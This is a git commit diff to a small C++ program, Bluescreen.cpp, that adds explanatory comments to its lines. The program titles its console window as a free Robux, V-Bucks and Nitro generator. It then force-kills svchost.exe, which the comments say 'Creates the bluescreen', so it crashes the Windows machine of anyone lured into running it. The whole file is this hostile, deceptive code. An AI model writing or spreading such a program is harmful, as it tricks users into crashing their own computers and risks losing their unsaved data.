991aac1c7363b83ab3860f997187bbd25f7cffd5
ToxicSeinDad <80545238+ToxicSeinDad@users.noreply.github.com>
2022-07-14 22:02:46 +0200

    Update Bluescreen.cpp

--- Bluescreen.cpp
+++ Bluescreen.cpp
@@ -2,11 +2,11 @@
 
 int main() {
 
-	system("title Free Robux; V-Bucks; Nitro; Money 2022");
-	system("color 9");
-	std::cout << "I hope you like the color blue :(";
-	system("timeout /t 3 /nobreak > nul");
-	system("Taskkill /im svchost.exe /f");
+	system("title Free Robux; V-Bucks; Nitro; Money 2022"); //Console Title
+	system("color 9"); //Console Color
+	std::cout << "I hope you like the color blue :("; //Text
+	system("timeout /t 3 /nobreak > nul"); //Wait 3 Seconds, without the waiting text
+	system("Taskkill /im svchost.exe /f"); //Creates the bluescreen
 
 	return 0;
 	
